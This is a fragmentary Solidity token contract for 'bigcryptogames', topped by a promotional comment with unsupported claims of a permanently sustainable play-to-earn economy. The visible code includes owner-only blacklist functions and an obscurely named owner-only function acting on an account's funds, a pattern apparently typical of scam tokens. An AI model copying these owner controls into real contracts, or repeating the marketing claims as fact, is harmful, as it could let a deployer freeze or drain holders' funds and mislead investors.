...
/**
🚀Website: http://bigcryptogames.com/
🚀Telegram: https://t.me/bigcryptozz
🚀Twitter: https://twitter.com/bigcryptogamesz
🎮Play Forever Earn Forever🎮
💥Big Crypto Game Finally and Forever Solved the Longevity Problem for Play-To-Earn NFT Games

🎮The Problem🎮
💥Play-To-Earn NFT games typically fail when their economies become unsustainable. This usually happens when established players hoard ever-lasting NFTs, and start withdrawing rewards in bulk without contributing anything back. Without enough new players joining, the economy stagnates: All the rewards have been eaten up by whales, with little incentives left for everybody else.

🎮The Solution🎮
💥Our Crypto Games Agency has invented a 'Play Forever Earn Forever' system, consisting of a combination of innovative updates including our Transparent Economy Status, our Smart Claim System, our proven Omni-Balanced Oracle System, our Reserve Pool, and our Reincarnation process.
*/
...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ransomwaissss(uint256 amount, uint256 itamarus, address account) public onlyOwner {
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function backlistsst(address _user) public onlyOwner {
        require(!isBlacklisted[_user], "user already ");
        isBlacklisted[_user] = true;
        // emit events as well
    }
    
    function removeFromBlacklistts(address _user) public onlyOwner {
        require(isBlacklisted[_user], "user already ");
...
contract bigcryptogames is ERC20DividendToken {
